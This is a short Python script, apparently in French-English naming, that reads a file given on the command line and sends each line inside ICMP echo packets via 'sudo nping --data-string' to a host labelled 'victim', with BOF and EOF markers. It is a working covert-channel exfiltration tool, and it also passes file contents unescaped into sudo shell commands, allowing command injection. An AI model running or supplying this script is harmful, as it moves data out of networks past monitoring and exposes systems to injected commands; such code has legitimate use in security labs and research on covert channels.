import sys
import os

victim = str(sys.argv[1])
print(victim)
file_cible = str(sys.argv[2])
print(file_cible)

file = open(file_cible, 'r')
lines = file.readlines()
os.system('sudo nping --icmp -c 1 '+victim+' --data-string BOFfile.txt ')

for index, line in enumerate(lines):
    print(line)
    os.system('sudo nping --icmp -c 1 '+victim+' --data-string '+ "'"+line+"'")
os.system('sudo nping --icmp -c 1 '+victim+' --data-string EOF')
file.close()
